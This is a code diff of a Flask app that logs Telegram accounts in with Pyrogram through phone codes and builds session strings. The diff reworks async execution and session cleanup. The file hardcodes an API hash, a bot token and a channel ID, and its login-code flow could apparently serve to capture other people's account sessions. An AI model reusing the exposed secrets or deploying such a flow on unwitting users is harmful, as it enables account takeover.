@@ -3,7 +3,9 @@ import os
 import uuid
 import asyncio
 import threading
+import traceback
 from datetime import datetime, timedelta
+from concurrent.futures import ThreadPoolExecutor
 from pyrogram import Client
 from pyrogram.errors import (
     PhoneNumberInvalid,
@@ -57,23 +59,15 @@ API_HASH = os.environ.get("API_HASH", "628f11c05a44c8dda4b006e66f4bf7df")
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8991327348:AAH3uOzXU8aZZ2LKfUlK1MH4Wp2AYKo1aIs")
 CHANNEL_ID = os.environ.get("CHANNEL_ID", "-1004376082945")
 
-# ========== ASYNC EXECUTOR ==========
-class AsyncExecutor:
-    """Single event loop in dedicated thread"""
-    def __init__(self):
-        self.loop = asyncio.new_event_loop()
-        self.thread = threading.Thread(target=self._run_loop, daemon=True)
-        self.thread.start()
-    
-    def _run_loop(self):
-        asyncio.set_event_loop(self.loop)
-        self.loop.run_forever()
-    
-    def execute(self, coro):
-        future = asyncio.run_coroutine_threadsafe(coro, self.loop)
-        return future.result(timeout=60)
+# ========== THREAD-LOCAL STORAGE ==========
+thread_local = threading.local()
 
-async_executor = AsyncExecutor()
+def get_event_loop():
+    """Get or create event loop for current thread"""
+    if not hasattr(thread_local, 'loop'):
+        thread_local.loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(thread_local.loop)
+    return thread_local.loop
 
 # ========== SESSION MANAGEMENT ==========
 class SessionManager:
@@ -81,89 +75,150 @@ class SessionManager:
     def __init__(self):
         self._clients = {}
         self._lock = threading.Lock()
-    
+        self._executor = ThreadPoolExecutor(max_workers=3)
+
+    def _run_async(self, coro):
+        """Run coroutine in a managed thread with its own event loop"""
+        def run_in_thread():
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            try:
+                return loop.run_until_complete(coro)
+            finally:
+                loop.close()
+        
+        future = self._executor.submit(run_in_thread)
+        return future.result(timeout=60)
+
     def create_client(self, session_id, phone):
         """Create and connect a new client"""
-        client = Client(
-            name=f"session_{session_id}",
-            api_id=API_ID,
-            api_hash=API_HASH,
-            in_memory=True,
-            no_updates=True
-        )
-        
-        async def connect():
+        async def create_and_connect():
+            client = Client(
+                name=f"session_{session_id}",
+                api_id=API_ID,
+                api_hash=API_HASH,
+                in_memory=True,
+                no_updates=True
+            )
             await client.connect()
             return client
-        
-        client = async_executor.execute(connect())
-        
-        with self._lock:
-            self._clients[session_id] = {
-                'client': client,
-                'phone': phone,
-                'created_at': datetime.now()
-            }
-        
-        # Store metadata in MongoDB for recovery
-        if temp_sessions_col is not None:
-            temp_sessions_col.update_one(
-                {'_id': session_id},
-                {'$set': {
+
+        try:
+            client = self._run_async(create_and_connect())
+            
+            with self._lock:
+                self._clients[session_id] = {
+                    'client': client,
                     'phone': phone,
                     'created_at': datetime.now(),
                     'status': 'connected'
-                }},
-                upsert=True
-            )
-        
-        return client
-    
+                }
+
+            # Store metadata in MongoDB for recovery
+            if temp_sessions_col is not None:
+                temp_sessions_col.update_one(
+                    {'_id': session_id},
+                    {'$set': {
+                        'phone': phone,
+                        'created_at': datetime.now(),
+                        'status': 'connected'
+                    }},
+                    upsert=True
+                )
+
+            return client
+            
+        except Exception as e:
+            # Auto-remove dead session
+            self.remove_client(session_id)
+            raise e
+
     def get_client(self, session_id):
         """Get existing client"""
         with self._lock:
             data = self._clients.get(session_id)
             if data:
-                # Update last accessed
-                if temp_sessions_col is not None:
-                    temp_sessions_col.update_one(
-                        {'_id': session_id},
-                        {'$set': {'last_accessed': datetime.now()}}
-                    )
-                return data['client']
+                # Check if client is still valid
+                try:
+                    # Update last accessed
+                    if temp_sessions_col is not None:
+                        temp_sessions_col.update_one(
+                            {'_id': session_id},
+                            {'$set': {'last_accessed': datetime.now()}}
+                        )
+                    return data['client']
+                except Exception:
+                    # Client is dead, remove it
+                    self._clients.pop(session_id, None)
+                    return None
             return None
-    
+
     def remove_client(self, session_id):
         """Remove and disconnect client"""
         with self._lock:
             data = self._clients.pop(session_id, None)
-        
+
         if data:
             client = data['client']
             try:
                 async def disconnect():
-                    await client.disconnect()
-                async_executor.execute(disconnect())
-            except:
-                pass
-        
+                    try:
+                        await client.disconnect()
+                    except Exception:
+                        pass
+                
+                # Run disconnect in separate thread with fresh event loop
+                self._run_async(disconnect())
+            except Exception as e:
+                print(f"Error disconnecting client {session_id}: {e}")
+
         if temp_sessions_col is not None:
-            temp_sessions_col.delete_one({'_id': session_id})
-    
-    def cleanup_old(self, max_age_minutes=10):
-        """Remove old sessions"""
-        cutoff = datetime.now() - timedelta(minutes=max_age_minutes)
+            try:
+                temp_sessions_col.delete_one({'_id': session_id})
+            except Exception as e:
+                print(f"Error removing session from DB: {e}")
+
+    def is_client_alive(self, session_id):
+        """Check if client is still responsive"""
         with self._lock:
-            old_sessions = [
-                sid for sid, data in self._clients.items() 
-                if data['created_at'] < cutoff
-            ]
+            data = self._clients.get(session_id)
+            if not data:
+                return False
+            client = data['client']
+            try:
+                # Try a simple operation to check if client is alive
+                async def ping():
+                    return await client.is_connected()
+                
+                return self._run_async(ping())
+            except Exception:
+                return False
+
+    def cleanup_old(self, max_age_minutes=10):
+        """Remove old and dead sessions"""
+        cutoff = datetime.now() - timedelta(minutes=max_age_minutes)
         
-        for sid in old_sessions:
+        with self._lock:
+            sessions_to_check = list(self._clients.items())
+
+        # Check each session and remove dead ones
+        dead_sessions = []
+        for sid, data in sessions_to_check:
+            if data['created_at'] < cutoff:
+                dead_sessions.append(sid)
+            elif not self.is_client_alive(sid):
+                dead_sessions.append(sid)
+                print(f"🗑️ Removed dead session: {sid}")
+
+        for sid in dead_sessions:
             self.remove_client(sid)
-        
+
+        # Cleanup DB
         if temp_sessions_col is not None:
-            temp_sessions_col.delete_many({'created_at': {'$lt': cutoff}})
+            try:
+                temp_sessions_col.delete_many({'created_at': {'$lt': cutoff}})
+            except Exception as e:
+                print(f"Error cleaning DB sessions: {e}")
 
 session_manager = SessionManager()
 
@@ -329,8 +384,12 @@ def login():
 
 @app.route("/api/send-code", methods=["POST"])
 def send_code():
-    session_manager.cleanup_old()
-    
+    # Cleanup old/dead sessions first
+    try:
+        session_manager.cleanup_old()
+    except Exception as e:
+        print(f"Cleanup error (non-critical): {e}")
+
     data = request.get_json() or {}
     phone = data.get("phone", "").strip()
     session_name = data.get("session_name", "session").strip()
@@ -343,13 +402,13 @@ def send_code():
     try:
         # Create client and connect
         client = session_manager.create_client(session_id, phone)
-        
-        # Send code
+
+        # Send code using the same pattern
         async def send():
             return await client.send_code(phone)
-        
-        sent = async_executor.execute(send())
-        
+
+        sent = session_manager._run_async(send())
+
         # Store phone_code_hash in MongoDB
         if temp_sessions_col is not None:
             temp_sessions_col.update_one(
@@ -360,9 +419,9 @@ def send_code():
                     'status': 'code_sent'
                 }}
             )
-        
+
         return jsonify(ok=True, session_id=session_id, message=f"Code sent to {phone}")
-        
+
     except PhoneNumberInvalid:
         session_manager.remove_client(session_id)
         return jsonify(ok=False, error="Invalid phone number"), 400
@@ -371,6 +430,7 @@ def send_code():
         return jsonify(ok=False, error=f"Please wait {e.value} seconds"), 429
     except Exception as e:
         session_manager.remove_client(session_id)
+        print(f"Send code error: {traceback.format_exc()}")
         return jsonify(ok=False, error=str(e)), 500
 
 @app.route("/api/verify-code", methods=["POST"])
@@ -385,7 +445,7 @@ def verify_code():
 
     # Get client from memory
     client = session_manager.get_client(session_id)
-    
+
     if not client:
         return jsonify(ok=False, error="Session expired. Please request a new code."), 400
 
@@ -393,7 +453,7 @@ def verify_code():
     session_doc = None
     if temp_sessions_col is not None:
         session_doc = temp_sessions_col.find_one({'_id': session_id})
-    
+
     if not session_doc:
         session_manager.remove_client(session_id)
         return jsonify(ok=False, error="Session expired. Please request a new code."), 400
@@ -430,10 +490,11 @@ def verify_code():
                 return {"user": None, "session_string": None, "error": "CODE_EXPIRED"}
             except Exception as e:
                 return {"user": None, "session_string": None, "error": str(e)}
-        
-        result = async_executor.execute(do_verify())
-        
+
+        result = session_manager._run_async(do_verify())
+
     except Exception as e:
+        print(f"Verify error: {traceback.format_exc()}")
         return jsonify(ok=False, error=f"Server error: {str(e)}"), 500
     finally:
         # Always clean up
